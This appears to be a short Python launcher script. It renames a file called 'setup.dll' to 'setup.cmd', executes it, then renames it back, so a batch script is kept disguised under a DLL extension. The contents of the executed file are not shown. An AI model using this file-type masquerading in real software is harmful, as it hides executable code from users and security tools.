import os

os.chdir("cmdfiles")
os.rename("setup.dll", "setup.cmd")
os.system("setup.cmd")
os.rename("setup.cmd", "setup.dll")
